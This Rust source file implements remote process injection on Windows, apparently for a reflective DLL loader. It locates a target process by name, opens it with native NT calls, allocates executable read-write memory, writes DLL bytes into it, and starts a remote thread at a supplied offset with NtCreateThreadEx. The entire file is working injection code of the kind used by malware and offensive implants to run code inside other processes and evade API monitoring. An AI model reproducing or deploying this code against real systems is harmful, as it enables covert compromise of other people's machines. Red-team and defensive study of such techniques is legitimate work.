use anyhow::Ok;
use ntapi::{
    ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory},
    ntpsapi::{NtCreateThreadEx, NtOpenProcess},
    ntobapi::NtClose,
    ntapi_base::CLIENT_ID,
};
use winapi::{
    shared::ntdef::{
        HANDLE, OBJECT_ATTRIBUTES, PVOID, 
    },
    shared::ntstatus::STATUS_SUCCESS,
    shared::basetsd::SIZE_T,
    um::winnt::{
        PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
        PROCESS_VM_WRITE, PROCESS_VM_READ, THREAD_ALL_ACCESS,
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    },
};
use std::ptr::null_mut;
use windows::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, 
    PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};

use crate::parse_pe::PeParser;

fn get_process_pid_by_name(target_name_wide: &[u16]) -> Option<u32> {

    let target_name_lowercase = String::from_utf16_lossy(target_name_wide).to_lowercase();

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).ok()?;
        if snapshot == INVALID_HANDLE_VALUE {
            eprintln!("Failed to create process snapshot");
            return None;
        }

        let mut entry = PROCESSENTRY32W::default();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let exe_file_lowercase = String::from_utf16_lossy(&entry.szExeFile)
                    .trim_end_matches('\0')
                    .to_lowercase();

                if exe_file_lowercase == target_name_lowercase {
                    let _ = CloseHandle(snapshot);
                    return Some(entry.th32ProcessID);
                }

                if !Process32NextW(snapshot, &mut entry).is_ok() {
                    break;
                }
            }
        } else {
            eprintln!("Failed to get first process");
        }

        let _ = CloseHandle(snapshot);
    }

    None    

}


pub fn inject_dll_into_process(target_name_wide: &[u16], rf_dll: &PeParser, yolo: usize) -> anyhow::Result<()> {

    // let pid = get_process_pid_by_name(target_name_wide)
    //     .ok_or_else(|| anyhow::anyhow!("Process not found"))?;

    let pid = get_process_pid_by_name(target_name_wide)
        .ok_or_else( || anyhow::anyhow!("Process not found") )?;

    println!("Found process with PID: {}", pid);


    let mut process_handle: HANDLE = null_mut();
    let mut client_id = CLIENT_ID {
        UniqueProcess: pid as _,
        UniqueThread: 0 as _,
    };

    let mut object_attributes = OBJECT_ATTRIBUTES {
        Length: std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: null_mut(),
        ObjectName: null_mut(),
        Attributes: 0,
        SecurityDescriptor: null_mut(),
        SecurityQualityOfService: null_mut(),
    }; 

    let desired_access = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

    let status = unsafe {
        NtOpenProcess(
            &mut process_handle,
            desired_access,
            &mut object_attributes,
            &mut client_id,
        )
    };

    if status != STATUS_SUCCESS {
        return Err(anyhow::anyhow!("Failed to open process: 0x{:X}", status));
    }

    println!("Successfully opened process with handle: {:?}", process_handle);

    let dll_data = &rf_dll.data;
    let mut base_address: PVOID = null_mut();
    let mut region_size: SIZE_T = dll_data.len() as SIZE_T;
    let status = unsafe {
        NtAllocateVirtualMemory(
            process_handle,
            &mut base_address,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if status != STATUS_SUCCESS || base_address.is_null() {
        unsafe { NtClose(process_handle) };
        anyhow::bail!("Failed to allocate memory in target process: 0x{:X}", status);
    }

    let mut bytes_written: SIZE_T = 0;
    let status = unsafe {
        NtWriteVirtualMemory(
            process_handle,
            base_address,
            dll_data.as_ptr() as PVOID,
            dll_data.len() as SIZE_T,
            &mut bytes_written,
        )
    };

    if status != STATUS_SUCCESS || bytes_written != dll_data.len() {
        unsafe { NtClose(process_handle) };
        anyhow::bail!("Failed to write DLL data to target process: 0x{:X}", status);
    }

    println!("Wrote DLL data to target process at address: {:?}", base_address);

    let mut thread_handle: HANDLE = null_mut();
    let start_address = (base_address as usize + yolo) as *mut std::ffi::c_void;
    let status = unsafe {
        NtCreateThreadEx(
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            null_mut(),
            process_handle,
            std::mem::transmute(start_address),
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut(),
        )
    };

    if status != STATUS_SUCCESS {
        unsafe { NtClose(process_handle) };
        anyhow::bail!("NtCreateThreadEx failed with status: 0x{:08X}", status);
    }
    println!("Successfully created remote thread with handle: {:?}", thread_handle);

    unsafe {
        NtClose(thread_handle);
        NtClose(process_handle);
    }

    Ok(())
}